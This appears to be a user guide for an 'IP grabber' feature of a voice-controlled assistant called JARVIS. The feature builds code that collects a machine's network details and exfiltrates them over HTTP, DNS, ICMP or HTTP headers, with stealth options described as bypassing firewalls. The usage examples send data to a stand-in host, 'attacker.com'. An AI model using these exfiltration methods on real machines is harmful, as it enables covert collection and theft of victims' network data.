# IP Grabber Guide

## Overview

JARVIS includes an IP grabber system for network reconnaissance and IP information extraction for authorized security testing.

⚠️ **WARNING**: For authorized testing and educational purposes only. Never use on systems you don't own or without proper authorization.

## Features

### Standard IP Grabber
- **Local IP**: Extract local network IP address
- **Public IP**: Get public/external IP address
- **Network Info**: Complete network configuration
- **DNS Servers**: Extract DNS server addresses
- **Connections**: Active network connections
- **Routing Table**: Network routing information
- **ARP Table**: ARP cache entries

### Advanced IP Grabber
- **Geolocation**: IP geolocation data
- **WHOIS**: WHOIS information lookup
- **Port Scanning**: Scan common ports
- **Subnet Scanning**: Scan local subnet for active hosts

### Stealth IP Grabber
- **DNS Exfiltration**: Encode data in DNS queries
- **ICMP Exfiltration**: Exfiltrate via ICMP packets
- **HTTP Headers**: Exfiltrate in HTTP headers

## Voice Commands

### Standard IP Grabber
```
"Create IP grabber"
"Grab local IP address"
"Get public IP address"
"Create IP grabber with network info and DNS servers"
"Grab IP with HTTP exfiltration to http://attacker.com"
```

### Advanced IP Grabber
```
"Create advanced IP grabber with geolocation"
"IP grabber with WHOIS and port scan"
"Advanced IP grabber with subnet scan"
"Create IP grabber with geolocation and WHOIS"
```

### Stealth IP Grabber
```
"Create stealth IP grabber"
"IP grabber with DNS exfiltration"
"Stealth IP grabber with ICMP"
"Hidden IP grabber with HTTP headers"
```

## Usage Examples

### Standard IP Grabber
```python
from cybersecurity.ip_grabber import IPGrabber

grabber = IPGrabber()

# Create standard IP grabber
result = grabber.create_ip_grabber(
    grab_types=['local_ip', 'public_ip', 'network_info', 'dns_servers'],
    exfil_method='http',
    exfil_url='http://attacker.com/exfil'
)
```

### Advanced IP Grabber
```python
# Create advanced IP grabber
result = grabber.create_advanced_ip_grabber(
    features=['geolocation', 'whois', 'port_scan', 'subnet_scan']
)
```

### Stealth IP Grabber
```python
# Create stealth IP grabber
result = grabber.create_stealth_ip_grabber(
    stealth_method='dns'  # or 'icmp', 'http_headers'
)
```

## What Gets Grabbed

### Network Information
- Local IP address
- Public IP address
- Hostname and FQDN
- Network interfaces
- IP configuration (ipconfig/ifconfig output)

### DNS Information
- DNS server addresses
- DNS configuration

### Network Connections
- Active TCP connections
- Listening ports
- Connection states
- Local and remote addresses

### Routing Information
- Routing table
- Default gateway
- Network routes
- Interface information

### ARP Information
- ARP cache entries
- IP to MAC mappings
- Network neighbors

### Advanced Features
- **Geolocation**: Country, city, ISP, coordinates
- **WHOIS**: Domain registration, owner information
- **Port Scan**: Open ports on target IPs
- **Subnet Scan**: Active hosts in local subnet

## Exfiltration Methods

### HTTP
- Send data via POST request
- JSON format
- Standard HTTP exfiltration

### DNS
- Encode data in DNS queries
- Stealthy exfiltration
- Bypass network filters
- Subdomain encoding

### ICMP
- Exfiltrate via ICMP packets
- Ping-based exfiltration
- Covert channel

### HTTP Headers
- Exfiltrate in HTTP headers
- Base64 encoded
- Hidden in normal traffic

### File
- Save to local file
- For testing purposes
- No network required

## Stealth Features

### DNS Exfiltration
- Encodes data in DNS subdomain
- Base64 encoding
- Bypasses firewalls
- Looks like normal DNS queries

### ICMP Exfiltration
- Uses ICMP packets
- Ping-based method
- Covert channel
- Hard to detect

### HTTP Header Exfiltration
- Data in custom headers
- Base64 encoded
- Hidden in normal HTTP traffic
- Low suspicion

## Security Notes

⚠️ **IMPORTANT**:
- All grabbers include warnings
- Use only in isolated VMs
- Get authorization before testing
- Never use on production systems
- Follow responsible disclosure
- This is for educational and authorized testing only

## Legal and Ethical

**ALLOWED**:
- ✅ Testing your own systems
- ✅ Authorized penetration testing
- ✅ Security research with permission
- ✅ Educational purposes
- ✅ Bug bounty programs (with authorization)

**NOT ALLOWED**:
- ❌ Testing without authorization
- ❌ Network scanning without permission
- ❌ Production systems without permission
- ❌ Violating terms of service
- ❌ Malicious purposes

## Best Practices

1. **Always get authorization** before testing
2. **Use isolated test environments** only
3. **Review generated code** before running
4. **Understand what the code does**
5. **Follow responsible disclosure** for vulnerabilities
6. **Document your testing** for authorized work
7. **Respect network boundaries**
8. **Don't scan external networks** without permission

## Troubleshooting

### "Cannot get public IP"
- Check internet connectivity
- Verify API services are accessible
- Try different IP services

### "Network info extraction failed"
- Check permissions (may need admin)
- Verify network tools are available
- Review error messages

### "Exfiltration failed"
- Verify exfil URL is accessible
- Check network connectivity
- Review firewall rules
- Try different exfiltration method

### "Port scan not working"
- Check firewall settings
- Verify target is reachable
- Review timeout settings
- Check permissions

---

**Remember: Use responsibly and only for authorized security testing!**
